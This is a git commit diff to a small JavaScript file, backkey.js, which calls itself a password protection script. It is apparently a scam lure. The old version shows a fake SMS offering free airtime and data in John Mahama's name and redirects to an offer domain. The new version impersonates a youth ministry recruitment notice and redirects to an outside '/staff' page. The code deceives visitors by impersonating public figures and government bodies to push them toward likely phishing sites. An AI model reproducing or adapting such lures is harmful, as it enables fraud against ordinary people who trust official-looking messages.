e436c435dfe4916ef56843e5dfba89b2f1c847a3
kenblogme <kenoly182@gmail.com>
2026-03-24 06:50:15 +0100

    Update backkey.js

--- backkey.js
+++ backkey.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'Recrutement'
+password=prompt('SMS: Bienvenue au Ministère de la Jeunesse et de lÉveil Patriotique Autonomisation et Recrutement, Veuillez appuyer sur OK pour continuer. ','Recrutement');
+if (password != 'Recrutement') {
+location.href='https://jeunesse-cd.ygnmf.com/staff';
 }
